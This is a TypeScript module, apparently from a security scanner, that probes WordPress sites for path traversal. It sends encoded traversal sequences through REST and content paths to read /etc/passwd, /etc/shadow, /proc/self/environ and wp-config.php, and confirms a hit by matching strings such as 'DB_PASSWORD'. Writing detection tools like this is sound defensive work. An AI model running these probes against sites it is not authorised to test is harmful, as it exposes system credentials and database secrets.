import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'WordPress Path Traversal';

const REST_ENDPOINTS = [
  '/wp-json/wp/v2/posts',
  '/wp-json/wp/v2/pages',
  '/wp-json/wp/v2/media',
  '/wp-json/wp/v2/users',
  '/wp-json/wp/v2/comments',
  '/wp-json/wp/v2/categories',
];

const DIRECT_PATHS = [
  '/wp-content/uploads',
  '/wp-content/themes',
  '/wp-content/plugins',
  '/wp-includes',
  '/wp-admin',
];

const TRAVERSAL_SEQS = [
  '../',
  '..%2f',
  '%2e%2e%2f',
  '..%252f',
  '....///',
];

const DEPTHS = [3];

const TARGET_FILES: [string, string][] = [
  ['etc/passwd',        'root:'],
  ['etc/shadow',        'root:'],
  ['proc/self/environ', 'PATH='],
  ['proc/self/cmdline', 'php'],
  ['wp-config.php',     'DB_PASSWORD'],
  ['wp-config.php.bak', 'DB_'],
  ['etc/hostname',      ''],
  ['windows/win.ini',   '[windows]'],
];

const HOSTNAME_RE = /^[A-Za-z0-9]([A-Za-z0-9\-\.]{0,252})?$/;

async function probe(url: string, indicator: string, findings: Finding[]): Promise<void> {
  const res = await fetchURL(url);
  if (!res || res.status !== 200) return;

  let body: string;
  try { body = await res.text(); } catch { return; }

  if (!indicator) {
    // /etc/hostname: guard against soft-404 HTML pages
    const ct = res.headers.get('Content-Type') ?? '';
    const isHtml = ct.toLowerCase().includes('text/html') ||
      body.trimStart().toLowerCase().startsWith('<!') ||
      body.trimStart().toLowerCase().startsWith('<html');
    if (isHtml) return;
    const stripped = body.trim();
    if (!HOSTNAME_RE.test(stripped)) return;
  } else {
    if (!body.toLowerCase().includes(indicator.toLowerCase())) return;
  }

  findings.push(finding(
    'PATH_TRAVERSAL_CONFIRMED',
    'CRITICAL',
    url,
    `Path traversal confirmed — '${indicator || 'hostname pattern'}' found in response`,
    { evidence: `indicator: ${indicator || 'hostname pattern'}` },
  ));
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  // Flatten all combos to parallelize safely within 25s budget
  const allPaths = [...REST_ENDPOINTS.map(e => [e, true] as [string, boolean]),
                    ...DIRECT_PATHS.map(p => [p, false] as [string, boolean])];
  const allCombos: [string, string, string, string, number][] = [];
  for (const [path] of allPaths) {
    for (const [filepath, indicator] of TARGET_FILES) {
      for (const seq of TRAVERSAL_SEQS) {
        for (const depth of DEPTHS) {
          allCombos.push([path, filepath, indicator, seq, depth]);
        }
      }
    }
  }

  try {
    await parallelProbe(allCombos, async ([path, filepath, indicator, seq, depth]) => {
      const traversal = seq.repeat(depth);
      const isRest = REST_ENDPOINTS.includes(path);
      const url = isRest
        ? `${target}${path}/1/${traversal}${filepath}`
        : `${target}${path}/${traversal}${filepath}`;
      await probe(url, indicator, findings);
    }, 50);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
